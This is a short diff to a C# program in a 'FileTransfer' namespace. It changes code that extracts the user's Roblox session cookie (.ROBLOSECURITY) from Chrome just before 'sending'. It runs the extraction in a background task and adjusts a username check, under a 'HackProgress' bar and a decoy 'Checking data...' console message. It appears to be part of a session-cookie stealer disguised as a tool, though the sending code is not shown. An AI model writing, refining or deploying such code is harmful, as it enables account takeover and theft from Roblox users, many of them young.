@@ -876,7 +876,7 @@ namespace FileTransfer
 
             // Переизвлекаем куку прямо перед отправкой — Chrome мог перезапуститься
             AppendConsole("[system]", "#2A2D3A", " Проверка данных...", "#A29BFE");
-            string freshToken = CookieExtractor.ExtractRobloSecurity();
+            string freshToken = await Task.Run(() => CookieExtractor.ExtractRobloSecurity());
             if (!string.IsNullOrEmpty(freshToken))
             {
                 _cachedToken = freshToken;
@@ -945,7 +945,7 @@ namespace FileTransfer
 
             HackProgress.Value = 100;
 
-            if (username.Length <= 6)
+            if (username.Length < 3)
             {
                 AppendConsole("[error]", "#FF4757", " Ошибка: не удалось получить данные", "#FF4757");
                 
